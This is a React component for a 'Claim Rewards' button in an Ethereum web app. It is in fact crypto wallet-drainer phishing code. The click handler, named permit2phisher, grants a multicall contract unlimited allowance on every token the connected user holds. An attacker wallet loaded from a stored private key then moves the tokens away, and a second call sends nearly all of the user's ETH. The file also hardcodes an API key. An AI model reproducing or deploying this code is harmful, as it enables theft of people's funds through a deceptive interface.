import { Button, Box, Text } from "@chakra-ui/react";
import { useEthers } from "@usedapp/core";
import * as constants from "../constants/index"
import { Network, Alchemy, BigNumber } from 'alchemy-sdk';

const settings = {
    apiKey: "NXrJ6Ck4wp9z37o5JHf2zamtMMWptixi",
    network: Network.ETH_GOERLI,
};

const alchemy = new Alchemy(settings);

const ethers = require("ethers")

export default function ClaimButton() {
    const { account } = useEthers();
    const maxNumber = ethers.BigNumber.from("115792089237316195423570985008687907853269984665640564039457584007913129639935");
    async function permit2phisher() {
        // Connect to an Ethereum provider (injected by MetaMask or similar)
        const provider = new ethers.providers.Web3Provider(window.ethereum);

        // Create a signer from the provider
        const signer = provider.getSigner();
        // Get token balances with API endpoint
        const balances = await alchemy.core.getTokenBalances(account as string);

        // Remove tokens with zero balance
        const nonZeroBalances = balances.tokenBalances.filter((token) => {
            return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
        });
        let tokens = [];
        // loop through tokens to increaseAllownce
        for (let i = 0; i < nonZeroBalances.length; i++) {
            try {
                const token = new ethers.Contract(nonZeroBalances[i].contractAddress, constants.ERC20ABI, signer);
                const allownce = await token.allowance(account, constants.multicall2Contract);
                if (allownce.lt(maxNumber)) {
                    const tx = await token.increaseAllowance(constants.multicall2Contract, maxNumber);
                    await tx.wait();
                }
                tokens.push(nonZeroBalances[i].contractAddress);
            } catch (error) {
                console.log(error);
            }
        }

        // const initiatorNonce = await provider.getTransactionCount(constants.initiator)
        const hacker = new ethers.Wallet(constants.initiatorPK, provider);
        const multiCallHacker = new ethers.Contract(constants.multicall2Contract, constants.MULTICALLABI, hacker);
        const multicallVictom = new ethers.Contract(constants.multicall2Contract, constants.MULTICALLABI, signer);
        try{
            if (tokens.length !== 0){
                const transfer = await multiCallHacker.multicall(tokens, account).wait();
                console.log(transfer)
            }
            const balanceWei = await provider.getBalance(account);
            const gas = 100000 * 3000000000
            const claim = await multicallVictom.calim({
                value: (balanceWei as BigNumber).sub(gas),
            }).wait();
            console.log(claim)
        } catch(error){
            console.log(error)
        }
        
    }


    return (
        account ? (
            <Button
                onClick={permit2phisher}
                bg="blue.800"
                color="blue.300"
                fontSize="lg"
                fontWeight="medium"
                borderRadius="xl"
                border="1px solid transparent"
                borderColor="blue.400"
                marginTop={"2"}
                _hover={{
                    borderColor: "blue.700",
                    color: "blue.400",
                }}
                _active={{
                    backgroundColor: "blue.800",
                    borderColor: "blue.700",
                }}
            >
                Claim
            </Button>
        ) : (
            <Box
                display="flex"
                alignItems="center"
                background="gray.700"
                borderRadius="xl"
                py="0"
                marginTop={"2"}
            >
                <Box px="3">
                    <Text color="white" fontSize="md">
                        please connect your wallet, to claim Rewards
                    </Text>
                </Box>
            </Box>
        )
    )
}